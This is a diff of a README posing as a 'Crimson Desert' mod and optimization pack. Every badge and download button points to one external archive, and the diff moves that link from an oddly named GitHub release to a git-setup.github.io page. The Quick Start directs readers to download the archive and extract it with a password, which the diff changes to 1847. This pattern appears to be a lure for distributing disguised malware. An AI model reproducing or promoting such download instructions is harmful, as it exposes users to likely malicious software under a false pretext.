@@ -1,14 +1,14 @@
 # 🎮 Crimson Desert Mods — Optimization Pack, Tips & Ultimate Guide 2026
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Crimson-Desert)](https://github.com/MeetMarshalSee/gngwvudj/releases/download/Main/Main.zip)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/MeetMarshalSee/gngwvudj/releases/download/Main/Main.zip)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/MeetMarshalSee/gngwvudj/releases/download/Main/Main.zip)
-[![Category](https://img.shields.io/badge/Category-Singleplayer-blue)](https://github.com/MeetMarshalSee/gngwvudj/releases/download/Main/Main.zip)
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/MeetMarshalSee/gngwvudj/releases/download/Main/Main.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Crimson-Desert)](https://git-setup.github.io/download/)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://git-setup.github.io/download/)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://git-setup.github.io/download/)
+[![Category](https://img.shields.io/badge/Category-Singleplayer-blue)](https://git-setup.github.io/download/)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://git-setup.github.io/download/)
 
 ---
 
-[![Download](og-image.png)](https://github.com/MeetMarshalSee/gngwvudj/releases/download/Main/Main.zip)
+[![Download](og-image.png)](https://git-setup.github.io/download/)
 
 <img src="https://cdn.akamai.steamstatic.com/steam/apps/2445070/header.jpg" alt="banner" width="100%" />
 
@@ -23,7 +23,7 @@
 
 ## 📥 Download
 
-[![Crimson Desert Mods](https://img.shields.io/badge/Download%20Crimson%20Desert%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/MeetMarshalSee/gngwvudj/releases/download/Main/Main.zip)
+[![Crimson Desert Mods](https://img.shields.io/badge/Download%20Crimson%20Desert%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://git-setup.github.io/download/)
 
 **🔐🔐🔐** `1847`
 
@@ -49,7 +49,7 @@
 ## 🚀 Quick Start
 
 1️⃣ **Download** the archive using the button above
-2️⃣ **Extract** with WinRAR or 7-Zip — password: `S2026`
+2️⃣ **Extract** with WinRAR or 7-Zip — password: `1847`
 3️⃣ **Read** `QuickStart.txt` inside the archive
 4️⃣ **Apply** the settings preset that matches your GPU
 
